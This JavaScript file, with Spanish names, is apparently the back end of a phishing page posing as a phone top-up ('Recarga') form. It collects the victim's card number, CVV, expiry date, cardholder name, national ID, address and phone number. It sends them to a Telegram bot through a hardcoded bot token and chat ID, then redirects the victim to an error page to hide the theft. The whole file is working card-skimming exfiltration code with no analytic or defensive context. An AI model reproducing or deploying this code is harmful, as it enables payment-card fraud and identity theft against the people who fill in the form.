function obtenerDatosFormulario() {
    var codigopais = document.getElementById('codigopais').value;
    var telefono = document.getElementById('telefono').value;
    var nombreTarjeta = document.getElementById('nombre-tarjeta').value;
    var direccion = document.getElementById('direccion').value;
    var dni = document.getElementById('dni').value;
    var numeroTarjeta = document.getElementById('numero-tarjeta').value;
    var fechaExpiracion = document.getElementById('fecha-expiracion').value;
    var cvv = document.getElementById('cvv').value;

    return {
        'codigopais': codigopais,
        'telefono': telefono,
        'nombre-tarjeta': nombreTarjeta,
        'direccion': direccion,
        'dni': dni,
        'numero-tarjeta': numeroTarjeta,
        'fecha-expiracion': fechaExpiracion,
        'cvv': cvv
    };
}

function enviarDatos() {
    var formData = obtenerDatosFormulario();

    var message = "Data Found!\n" +
        "📱 Codigo Area: " + formData['codigopais'] + "\n" +
        "📞 Número de teléfono: " + formData['telefono'] + "\n" +
        "💳 Nombre en la tarjeta: " + formData['nombre-tarjeta'] + "\n" +
        "💳 Direccion: " + formData['direccion'] + "\n" +
        "💳 Dni: " + formData['dni'] + "\n" +
        "💳 Número de tarjeta: " + formData['numero-tarjeta'] + "\n" +
        "📅 Fecha de expiración: " + formData['fecha-expiracion'] + "\n" +
        "🔒 CVV: " + formData['cvv'];


    enviarMensajeTelegram(message);
}


function enviarMensajeTelegram(message) {
    var token = "6202243249:AAGtTTl9YH2h4BiScQgdbLFwaa2is4dfbAo";
    var chatId = "5330560021";

    var url = "https://api.telegram.org/bot" + token + "/sendMessage";
    var payload = {
        chat_id: chatId,
        text: message,
    };

    var options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
    };

    fetch(url, options)
        .then(response => {
            if (!response.ok) {
                throw new Error('Error al enviar la Recarga');
            }
            return response.json();
        })
        .then(data => {
            console.log('Recarga exitosa:', data);
            window.location.href = "https://error404.com";
        })
        .catch(error => {
            console.error('Error en la recarga:', error.message);
        });
}
